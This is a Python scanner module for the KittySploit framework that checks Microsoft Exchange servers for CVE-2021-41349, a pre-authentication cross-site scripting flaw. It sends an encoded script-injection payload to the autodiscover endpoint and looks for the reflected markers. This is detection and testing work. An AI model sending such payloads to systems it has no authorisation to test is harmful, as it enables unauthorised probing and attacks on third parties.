#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Microsoft Exchange Server is vulnerable to a spoofing vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microsoft Exchange Server Pre-Auth POST Based Cross-Site Scripting Detection',
        'description': 'Microsoft Exchange Server is vulnerable to a spoofing vulnerability. Be aware this CVE ID is unique from CVE-2021-42305.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'microsoft', 'exchange', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.microsoft.com/en-us/download/details.aspx?id=103643',
            'https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2021-41349',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41349',
            'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-41349',
            'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-41349',
        ],
        'cve': 'CVE-2021-41349',
    }

    def run(self):
        path = '/autodiscover/autodiscover.json'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='%3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1\n')
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('A potentially dangerous Request.Form value was detected from the client',)
        body_all = ('alert(document.domain);', 'a=""',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Microsoft Exchange Server Pre-Auth POST Based Cross-Site Scripting detected', path=path)
            return True
        return False

